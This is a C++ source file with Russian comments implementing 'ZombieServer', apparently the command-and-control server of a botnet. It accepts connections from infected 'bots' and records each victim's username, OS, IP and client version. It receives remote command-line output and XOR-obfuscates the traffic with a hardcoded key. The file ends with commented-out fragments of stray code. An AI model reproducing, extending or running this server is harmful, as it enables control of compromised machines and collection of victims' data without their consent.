#include "stdafx.h"
#include "Packet.h"
#include "ZombieServer.h"

// Конструктор
ZombieServer::ZombieServer()
{
	for (int x = 0; x < MAX_CLIENT + 1; x++)
	{
		// Обнуляем данные каждого клиента
		client_socket[x] = 0;
		client_event[x] = 0;
		writeAccess[x] = FALSE;
		numRecv[x] = 0;
		numSend[x] = 0;
		id[x] = 0;
		writeBuffer[x] = (char*)malloc(PACKET_SIZE);
		sizeWriteBuffer[x] = PACKET_SIZE;
		ZeroMemory(recvBuffer, PACKET_SIZE);
	}
	unicID = 1;
	eventTotal = 0;
}

// Метод стартует ассинхронный сервер (WSAEventSelect)
BOOL ZombieServer::StartServer(HWND hWndPar)
{
	hWnd = hWndPar; // Сохраняем хендл окна, в которое будем передавать сообщения

	SOCKADDR_IN servAddr;				// Адрес для связывания с сокетом
	SOCKET listenSocket;				// Слушающий сокет
	WSAEVENT newEvent;					// Вновь созданное событие для связывание с сокетом

										// Создаем серверный сокет
	if ((listenSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == INVALID_SOCKET)
	{
		MessageBox(NULL, "Ошибка создания сокета!", "Ошибка", MB_OK);
		WSACleanup();
		return FALSE;
	}

	servAddr.sin_family = AF_INET;
	servAddr.sin_addr.s_addr = htonl(INADDR_ANY);
	servAddr.sin_port = htons(PORT);

	// Связываем серверный сокет с адресом
	if (bind(listenSocket, (SOCKADDR *)&servAddr, sizeof(servAddr)) == SOCKET_ERROR)
	{
		MessageBox(NULL, "Ошибка связывания!", "Ошибка", MB_OK);
		closesocket(listenSocket);
		WSACleanup();
		return FALSE;
	}

	// Создаем новое событие
	if ((newEvent = WSACreateEvent()) == WSA_INVALID_EVENT)
	{
		MessageBox(NULL, "Ошибка создания события!", "Ошибка", MB_OK);
		closesocket(listenSocket);
		WSACleanup();
		return FALSE;
	}

	// Связываем событие с серверным сокетом
	if (WSAEventSelect(listenSocket, newEvent, FD_ACCEPT | FD_CLOSE) == SOCKET_ERROR)
	{
		MessageBox(NULL, "Ошибка связывания сокета с событием!", "Ошибка", MB_OK);
		WSACloseEvent(newEvent);
		closesocket(listenSocket);
		WSACleanup();
		return FALSE;
	}

	// Запускаем прослушивание серверного сокета
	if (listen(listenSocket, 1) == SOCKET_ERROR)
	{
		MessageBox(NULL, "Ошибка прослушки порта!", "Ошибка", MB_OK);
		WSACloseEvent(newEvent);
		closesocket(listenSocket);
		WSACleanup();
		return FALSE;
	}

	// Добавляем сокет и событие в массив
	client_socket[eventTotal] = listenSocket;
	client_event[eventTotal] = newEvent;
	eventTotal = 1;

	// Запускаем поток обработки событий
	DWORD tPar;
	HANDLE hThread;
	hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)ThreadEvents, this, NULL, &tPar);

	return TRUE;
}

// Метод отсылает сообщение клиенту
BOOL ZombieServer::SendPacket(int indexWait, Packet* packet)
{
	DWORD* uF = 0;
	char bufferSend[PACKET_SIZE];

	uF = (DWORD*)&bufferSend;
	*uF = packet->type;
	uF = (DWORD*)&bufferSend[4];
	*uF = packet->id;
	uF = (DWORD*)&bufferSend[8];
	*uF = packet->id1;
	uF = (DWORD*)&bufferSend[12];
	*uF = packet->id2;

	memcpy(bufferSend + 16, packet->data, PACKET_DATA_SIZE);

	Crypt(bufferSend, PACKET_SIZE);

	if (writeAccess[indexWait] == FALSE)
	{
		// Доступ к записи в сокет закрыт
		if (sizeWriteBuffer[indexWait] - numSend[indexWait] < PACKET_SIZE)
		{
			// В буфере нет места для нового пакета, приращиваем буфер
			writeBuffer[indexWait] = (char*)realloc(writeBuffer[indexWait], sizeWriteBuffer[indexWait] + PACKET_SIZE);
			sizeWriteBuffer[indexWait] = sizeWriteBuffer[indexWait] + PACKET_SIZE;
		}

		// Пишем во временный буфер
		memcpy(writeBuffer[indexWait] + numSend[indexWait], bufferSend, PACKET_SIZE);
		numSend[indexWait] = numSend[indexWait] + PACKET_SIZE;
		writeAccess[indexWait] = FALSE;
		return TRUE;
	}
	else if (writeAccess[indexWait] == TRUE)
	{
		// Доступ к записи в сокет открыт, пишем в сокет
		int iSend = send(client_socket[indexWait], bufferSend, PACKET_SIZE, 0);
		if (iSend == PACKET_SIZE)
		{
			//Отправка данных прошла успешно
			numSend[indexWait] = 0;
			return TRUE;
		}
		else if (iSend == SOCKET_ERROR && WSAGetLastError() == WSAEWOULDBLOCK)
		{
			// Сокет заблокирован, пишем во временный буфер
			memcpy(writeBuffer[indexWait], bufferSend, PACKET_SIZE);
			numSend[indexWait] = PACKET_SIZE;
			writeAccess[indexWait] = FALSE;
			return TRUE;
		}
		else
		{
			// Ошибка записи в сокет
			return FALSE;
		}
	}
}

// Подключает нового клиента
BOOL ZombieServer::AcceptClient(DWORD index)
{
	// WSA_MAXIMUM_WAIT_EVENTS - максимальное число ожидаемых событий

	SOCKADDR addrBot; // Структура принимает данные о подключившемся клиете (IP адрес)

	// Подключаем клиента
	client_socket[eventTotal] = accept(client_socket[index], &addrBot, NULL);
	if (client_socket[eventTotal] == SOCKET_ERROR)
	{
		// Ошибка
		return FALSE;
	}

	// Создаем событие для подключенного бота
	client_event[eventTotal] = WSACreateEvent();

	// Связываем клиента (сокет) с событием
	WSAEventSelect(client_socket[eventTotal], client_event[eventTotal], FD_READ | FD_WRITE | FD_CLOSE);

	id[eventTotal] = unicID;

	// Запрашиваем у клиента информацию
	Packet packet;
	ZeroMemory(packet.data, PACKET_DATA_SIZE);
	packet.type = PACKET_ADD_ID;
	packet.id = id[eventTotal];
	SendPacket(eventTotal, &packet);

	eventTotal++;
	unicID++;
	return TRUE;
}

// Закрывает соединение с клиентом
void ZombieServer::CloseClient(DWORD index)
{
	WSAEventSelect(client_socket[index], client_event[index], 0L);
	WSACloseEvent(client_event[index]);
	closesocket(client_socket[index]);

	// Отправка данных в окно
	char IDS[10] = "";
	_itoa_s(id[index], IDS, 10);
	SendMessage(hWnd, WM_CLOSE_CLIENT, (WPARAM)IDS, 0);

	// Очищаем буфер, сдвигаем массивы
	for (int x = index; x < eventTotal; x++)
	{
		client_socket[x] = client_socket[x + 1];
		client_event[x] = client_event[x + 1];
		writeAccess[x] = writeAccess[x + 1];
		id[x] = id[x + 1];
		numRecv[x] = numRecv[x + 1];
		numSend[x] = numSend[x + 1];
		memcpy(recvBuffer[x], recvBuffer[x + 1], PACKET_SIZE);
		writeBuffer[x] = writeBuffer[x + 1];
		sizeWriteBuffer[x] = sizeWriteBuffer[x + 1];
	}

	// Уменьшаем счетчик клиентов
	eventTotal--;

	return;
}

// Возвращает ID клиента
int ZombieServer::GetID(DWORD indexWait)
{
	return id[indexWait];
}

// Отправляет данные из временного буффера
BOOL ZombieServer::WriteClient(DWORD indexWait)
{
	// Устанавливаем индикатор открытого доступа для записи в сокет
	writeAccess[indexWait] = TRUE;

	if (numSend[indexWait] != 0)
	{
		// Во временном буффере есть данные для отправки
		int errSend = send(client_socket[indexWait], writeBuffer[indexWait], numSend[indexWait], 0);
		if (errSend == SOCKET_ERROR && WSAGetLastError() == WSAEWOULDBLOCK)
		{
			// Сокет заблокирован
			writeAccess[indexWait] = FALSE;
			return TRUE;
		}
		else if (errSend != SOCKET_ERROR && errSend == numSend[indexWait])
		{
			writeAccess[indexWait] = TRUE;
			numSend[indexWait] = 0;
			return TRUE;
		}
		else
		{
			return FALSE;
		}
	}
	return TRUE;
}

// Возвращает сообщение клиента
BOOL ZombieServer::ReadClient(DWORD indexWait)
{
	// Читаем данные
	int iResult = recv(client_socket[indexWait], recvBuffer[indexWait] + numRecv[indexWait], PACKET_SIZE - numRecv[indexWait], 0);
	if (iResult == PACKET_SIZE - numRecv[indexWait])
	{
		// Данные пакета прочитаны полностью
		numRecv[indexWait] = 0;

		// Расшифровываем данные
		Crypt(recvBuffer[indexWait], PACKET_SIZE);

		Packet pak;
		pak.type = ParsePacketType(recvBuffer[indexWait]);
		pak.id = ParseID(recvBuffer[indexWait]);
		pak.id1 = ParseID1(recvBuffer[indexWait]);
		pak.id2 = ParseID2(recvBuffer[indexWait]);
		memcpy(pak.data, recvBuffer[indexWait] + 16, PACKET_DATA_SIZE);
		WorkData(&pak);
		return TRUE;
	}
	else if (iResult < PACKET_SIZE - numRecv[indexWait])
	{
		// Пакет не полностью прочитан
		numRecv[indexWait] = numRecv[indexWait] + iResult;
		return TRUE;

	}
	else if (iResult == SOCKET_ERROR && WSAGetLastError() == WSAEWOULDBLOCK)
	{
		// Сокет заблокирован
		return TRUE;
	}
	else
	{
		// Ошибка
		return FALSE;
	}
}

void ZombieServer::WorkData(Packet* pak)
{
	User user; // Переменная для хранения информации о подключенном клиенте

	// Реагируем на полученное сообщение в соответствии с типом пакета
	switch (pak->type)
	{
	case PACKET_USER_JOINED:

		// Отправляем информация о подключенном клиенте в окно
		ParseUser(pak->data, &user);
		SendMessage(hWnd, WM_JOINED_CLIENT, (WPARAM)&user, 0);
		return;

	case PACKET_CMD_REPORT:

		// Отправляем данные из командной строки
		SendMessage(hWnd, WM_CMD_REPORT, (WPARAM)pak->data, PACKET_DATA_SIZE);
		return;
	}
}

// Обработка событий сервера
DWORD WINAPI ZombieServer::ThreadEvents(LPVOID lpParameter)
{
	ZombieServer* pZomb = (ZombieServer*)lpParameter;	// Указатель на вызывающий объект

	DWORD indexWait;				// Номер сокета в массиве в котором произошло событие
	WSANETWORKEVENTS net;			// Событие в сокете
	BOOL done = FALSE;				// Индикатор выхода из цикла ожидания события

	while (done == FALSE)
	{
		// Ждем сетевое событие
		indexWait = WSAWaitForMultipleEvents(pZomb->eventTotal, pZomb->client_event, FALSE, WSA_INFINITE, FALSE);
		if (indexWait == WSA_WAIT_FAILED || indexWait == WSA_WAIT_TIMEOUT)
		{
			break;
		}

		indexWait -= WSA_WAIT_EVENT_0;

		// Выясняем какое событие произошло
		if (WSAEnumNetworkEvents(pZomb->client_socket[indexWait], pZomb->client_event[indexWait], &net) == SOCKET_ERROR)
		{
			// Обработка ошибки
			if (indexWait == NULL)
			{
				// Ошибка произошла на слушающем(серверном) сокете, завершаем поток сервера
				break;
			}
			else
			{
				// Ошибка произошла на клиентском сокете, закрываем клиента, ждем событий дальше
				pZomb->CloseClient(indexWait);;
				continue;
			}
		}

		// Клиент ожидает подключения
		if (net.lNetworkEvents & FD_ACCEPT)
		{
			if (net.iErrorCode[FD_ACCEPT_BIT] != 0 || pZomb->AcceptClient(indexWait) == FALSE)
			{
				// Обработка ошибки
				break;
			}
		}

		// Есть данные для чтения
		if (net.lNetworkEvents & FD_READ)
		{
			if (net.iErrorCode[FD_READ_BIT] != 0 || pZomb->ReadClient(indexWait) == FALSE)
			{
				// Обработка ошибки
				pZomb->CloseClient(indexWait);
				continue;
			}
		}

		// Буфер сокета свободен для записи
		if (net.lNetworkEvents & FD_WRITE)
		{
			if (net.iErrorCode[FD_WRITE_BIT] != 0 || pZomb->WriteClient(indexWait) == FALSE)
			{
				// Обработка ошибки
				pZomb->CloseClient(indexWait);
				continue;
			}
		}

		// Соединение с клиентом закрыто
		if (net.lNetworkEvents & FD_CLOSE)
		{
			if (net.iErrorCode[FD_CLOSE_BIT] != 0)
			{

			}
			pZomb->CloseClient(indexWait);
		}
	}
	ExitProcess(0);
}

// Функция парсит пришедший пакет
void ZombieServer::ParseUser(char* data, User* user)
{
	ZeroMemory(user->id, 128);
	ZeroMemory(user->name, 128);
	ZeroMemory(user->os, 128);
	ZeroMemory(user->ip, 128);
	ZeroMemory(user->ver, 128);

	int i = 0;
	int p = 0;
	int count = 0;

	while (data[i] != NULL)
	{
		switch (count)
		{
		case 0: // ID
			if (data[i] == '|' || data[i] == NULL)
			{
				p = 0;
				count++;
				break;
			}
			user->id[p] = data[i];
			p++;
			break;
		case 1: // Имя пользователя
			if (data[i] == '|' || data[i] == NULL)
			{
				p = 0;
				count++;
				break;
			}
			user->name[p] = data[i];
			p++;
			break;
		case 2: // OS
			if (data[i] == '|' || data[i] == NULL)
			{
				p = 0;
				count++;
				break;
			}
			user->os[p] = data[i];
			p++;
			break;
		case 3: // IP
			if (data[i] == '|' || data[i] == NULL)
			{
				p = 0;
				count++;
				break;
			}
			user->ip[p] = data[i];
			p++;
			break;
		case 4: // Версия клиента
			if (data[i] == '|' || data[i] == NULL)
			{
				p = 0;
				count++;
				break;
			}
			user->ver[p] = data[i];
			p++;
			break;
		}
		i++;
	}

	// Преобразуем разпарсенные строки в юникод
	int wsize = MultiByteToWideChar(1251, 0, user->id, -1, 0, 0);
	MultiByteToWideChar(1251, 0, user->id, -1, user->wID, wsize);

	wsize = MultiByteToWideChar(1251, 0, user->name, -1, 0, 0);
	MultiByteToWideChar(1251, 0, user->name, -1, user->wName, wsize);

	wsize = MultiByteToWideChar(1251, 0, user->os, -1, 0, 0);
	MultiByteToWideChar(1251, 0, user->os, -1, user->wOS, wsize);

	wsize = MultiByteToWideChar(1251, 0, user->ip, -1, 0, 0);
	MultiByteToWideChar(1251, 0, user->ip, -1, user->wIP, wsize);

	wsize = MultiByteToWideChar(1251, 0, user->ver, -1, 0, 0);
	MultiByteToWideChar(1251, 0, user->ver, -1, user->wVer, wsize);

	return;
}

// Расшифровка пакета
void ZombieServer::Crypt(char* cryptData, int sizeCryptData)
{
	const unsigned char key[8] = { 193, 127, 143, 121, 167, 179, 187, 191 }; // Ключ шифрования
	int iKey = 0;
	char ch;

	for (int i = 0; i < sizeCryptData; i++)
	{
		ch = cryptData[i];
		cryptData[i] = ch ^ key[iKey];
		iKey++;
		iKey %= 8;
	}
	return;
}

DWORD ZombieServer::ParsePacketType(char* data)
{
	char* uR = 0;
	DWORD packetType;

	// Парсим тип пакета
	uR = (char*)&packetType;
	for (int i = 0; i < 4; i++)
	{
		uR[i] = data[i];
	}
	return packetType;
}

DWORD ZombieServer::ParseID(char* data)
{
	char* uR = 0;
	DWORD id;

	// Парсим тип пакета
	uR = (char*)&id;
	for (int i = 0; i < 4; i++)
	{
		uR[i] = data[i + 4];
	}
	return id;
}

DWORD ZombieServer::ParseID1(char* data)
{
	char* uR = 0;
	DWORD id1;

	// Парсим тип пакета
	uR = (char*)&id1;
	for (int i = 0; i < 4; i++)
	{
		uR[i] = data[i + 8];
	}
	return id1;
}

DWORD ZombieServer::ParseID2(char* data)
{
	char* uR = 0;
	DWORD id2;

	// Парсим тип пакета
	uR = (char*)&id2;
	for (int i = 0; i < 4; i++)
	{
		uR[i] = data[i + 12];
	}
	return id2;
}

/*

case PACKET_CMD_REPORT:

// Сообщение с выводом из командной строки
wchar_t wReportBuffer[4096] = L"";
int wsize = MultiByteToWideChar(1251, 0, zombie.data, -1, 0, 0);
MultiByteToWideChar(1251, 0, zombie.data, -1, wReportBuffer, wsize);
lstrcat(reportBuffer, wReportBuffer);
SetWindowText(hEditView, reportBuffer);
break;

}

return packetType;
}



// Сообщение с выводом из командной строки
wchar_t wReportBuffer[4096] = L"";
int wsize = MultiByteToWideChar(1251, 0, zombie.data, -1, 0, 0);
MultiByteToWideChar(1251, 0, zombie.data, -1, wReportBuffer, wsize);
lstrcat(reportBuffer, wReportBuffer);
SetWindowText(hEditView, reportBuffer);
break;







*/

/*	if (writeAccess[indexWait] == FALSE)
{
// Доступ к записи в сокет закрыт
if (sizeWriteBuffer[indexWait] - numSend[indexWait] < PACKET_SIZE)
{
// В буфере нет места для нового пакета, приращиваем буфер
writeBuffer[indexWait] = (char*)realloc(writeBuffer[indexWait], sizeWriteBuffer[indexWait] + PACKET_SIZE);
sizeWriteBuffer[indexWait] = sizeWriteBuffer[indexWait] + PACKET_SIZE;
}

// Пишем во временный буфер
memcpy(writeBuffer[indexWait] + numSend[indexWait], bufferSend, PACKET_SIZE);
numSend[indexWait] = numSend[indexWait] + PACKET_SIZE;
writeAccess[indexWait] = FALSE;
return;
}
else if (writeAccess[indexWait] == TRUE)
{
// Доступ к записи в сокет открыт, пишем в сокет
int iSend = send(client_socket[indexWait], bufferSend, PACKET_SIZE, 0);
if (iSend == SOCKET_ERROR)
{
if (WSAGetLastError() == WSAEWOULDBLOCK)
{
// Ошибка записи, сокет заблокирован, пишем во временный буфер
memcpy(writeBuffer[indexWait], bufferSend, PACKET_SIZE);
numSend[indexWait] = PACKET_SIZE;
writeAccess[indexWait] = FALSE;
return;
}
else
{
MessageBox(NULL, "Неизвестная ошибка send", "Этого не должно быть", MB_OK);
}
}
else if (iSend != SOCKET_ERROR && iSend < PACKET_SIZE)
{
MessageBox(NULL, "Send отправила часть данных", "Этого не должно быть", MB_OK);
}
else
{
numSend[indexWait] = 0;
}
}
return;
}
*/